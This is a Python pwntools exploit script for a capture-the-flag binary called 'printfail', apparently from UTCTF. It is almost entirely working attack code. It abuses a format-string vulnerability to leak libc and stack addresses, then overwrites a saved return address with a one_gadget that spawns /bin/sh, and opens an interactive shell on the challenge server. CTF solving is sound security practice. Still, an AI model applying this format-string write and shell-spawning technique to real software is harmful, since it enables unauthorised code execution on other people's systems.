from re import T
from pwn import *

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./printfail"
libc_path = "/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("puffer.utctf.live", 4630)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


# leak rbp ,libc, and reset v4 to a number greate than 0
start_main_delta = 0x7f9892de2083 - 0x7f9892dbe000 # 0x24083
rbp_delta = 0x7ffdfbfa6230 - 0x7ffdfbfa6244
payload = "11%7$hhn--%13$p--%7$p--"
io.sendlineafter('No do-overs.\n', payload)
io.recvuntil("--", drop=True)
o13p = int(io.recvuntil("--", drop=True), 16)
libc.address = o13p - start_main_delta
o7p = int(io.recvuntil("--", drop=True), 16)
rbp = o7p + rbp_delta
success("libc.address -> " + hex(libc.address))
success("rbp -> " + hex(rbp))

# one_gadget
"""
0xe3afe execve("/bin/sh", r15, r12)
0xe3b01 execve("/bin/sh", r15, rdx)
0xe3b04 execve("/bin/sh", rsi, rdx)
"""
one_gadget = libc.address + 0xe3b01
success("one_gadget -> " + hex(one_gadget))
stack_ret = rbp + 0x28
success("stack_ret -> " + hex(stack_ret))

ddebug("b read")

io.sendlineafter("another chance.\n", "%" + str((stack_ret + 2) & 0xffff) + "c%15$hn%7$hhn")
io.sendlineafter("another chance.\n", "%" + str((one_gadget >> 16) & 0xff) + "c%43$hhn%7$hhn")
io.sendlineafter("another chance.\n", "%" + str((stack_ret) & 0xffff) + "c%15$hn%7$hhn")
io.sendlineafter("another chance.\n", "%" + str((one_gadget) & 0xffff) + "c%43$hn")

io.interactive()
